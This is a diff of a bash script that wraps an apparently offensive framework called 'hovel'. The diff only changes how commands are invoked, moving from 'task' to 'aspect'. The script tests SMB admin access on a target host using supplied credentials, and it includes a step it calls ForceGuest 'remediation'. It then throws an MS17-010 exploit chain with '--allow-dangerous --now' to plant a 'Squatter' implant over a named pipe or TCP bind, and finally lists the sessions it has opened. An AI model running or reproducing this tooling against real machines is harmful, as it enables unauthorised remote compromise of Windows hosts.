@@ -28,7 +28,7 @@ if [[ -n "$remote_path" ]]; then
 fi
 
 admin_probe_ok() {
-  HOVEL_MODULE_CONFIG="$module_config" task run -- //modules/squatter/client/cmd/smbadminctl -- \
+  HOVEL_MODULE_CONFIG="$module_config" aspect run //modules/squatter/client/cmd/smbadminctl -- \
     --user "$smb_user" --password "$smb_password" --domain "$smb_domain" --read 'C:\Windows\win.ini' "$target_host" >/dev/null
 }
 
@@ -68,7 +68,7 @@ maybe_disable_forceguest() {
   fi
   echo "SMB admin probe failed; throwing MS17-010 ForceGuest remediation"
   write_forceguest_chain
-  HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$forceguest_chain" --allow-dangerous --now
+  HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" aspect hovel throw -- "$forceguest_chain" --allow-dangerous --now
   sleep 3
 }
 
@@ -119,7 +119,7 @@ if [[ "$transport" == "smb-named-pipe" ]]; then
 else
   echo "Throwing MS17-010 -> Squatter TCP bind at $target_host:$bind_port"
 fi
-HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$chain_file" --allow-dangerous --now
+HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" aspect hovel throw -- "$chain_file" --allow-dangerous --now
 echo
 echo "Active sessions:"
-HOVEL_MODULE_CONFIG="$module_config" task run -- //cmd/hovel -- session list --workspace "$workspace"
+HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" aspect hovel session -- list
